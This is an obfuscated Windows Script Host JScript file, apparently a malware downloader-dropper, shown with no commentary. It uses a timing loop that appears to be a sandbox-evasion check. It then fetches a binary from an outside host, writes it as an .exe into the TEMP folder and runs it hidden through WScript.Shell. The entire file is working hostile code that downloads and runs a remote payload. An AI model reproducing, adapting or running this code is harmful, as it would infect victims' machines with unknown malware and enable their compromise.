var Bu = false;
var DN = "CreateObject";
var T = function b() {return WScript[DN]("WScript.Shell");}(), A0 = 11;
var q0 = "MSXML2.XMLHTTP";
var Gv = 2123213;
var vj = 0;
function q(z){T["Run"](z, vj, vj);};
function X(){return "" + q0;};
function xP(Wg, aL){vj = vj * 1; return Wg - aL;};
function o(){return DN;};
/*@cc_on
  @if (@_win32 || @_win64)
    Bu = true;
  @end
@*/
if (Bu)
{
var Q = "";
function XO(){return 22;};
var A = 0; var wA = 0;
function D()
{
var B = new this["Date"]();
var TP = B["getUTCMilliseconds"]();
WScript["Sleep"](XO());
var B = new this["Date"]();
var L = B["getUTCMilliseconds"]();
WScript["Sleep"](XO());
var B = new this["Date"]();
var w = B["getUTCMilliseconds"]();
var A = "Fd";
A = xP(L, TP);
var wA = "fx";
wA = xP(w, L);
Q = "open";
return xP(A, wA);
}
var gB = false;
var C = false;
for (var mT = vj; mT < XO() * 1; mT++){if (D() != vj){
gB = true; 
wA = "31" + 11 * A + wA; 
C = true; 
break;
}}
function AA() {return ((gB == true) && (gB == C)) ? 1 : vj;};
if (gB && AA() && C){
function jl() {return T["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "gMgFANIjfsBzP.exe";};
 Ve = X();
 YC = WScript[DN](Ve);
 var e = 1;
 while (e){
try {
YC[Q]("GET", "http://dealingdeuces.com/o4pskd", false);
YC["send"]();
I = "Sleep";
for (;;){WScript[I](XO() * 11); if (YC["readystate"] >= 2 * 2) break;};
e = vj;
} catch(qA){};
}
function lB(V) {var qR = (1, 2, 3, 4, 5, V); return qR;};
JJ = WScript[o()]("ADODB.Stream");
Ve = JJ;
Ve[Q]();
Ve["type"] = lB(1);
Ve["write"](YC["ResponseBody"]);
JJ["position"] = lB(vj);
Ve["Save" + "ToFile"](jl(), 2);
JJ["c"+"lose"]();
i = jl();
q(i);
}
}

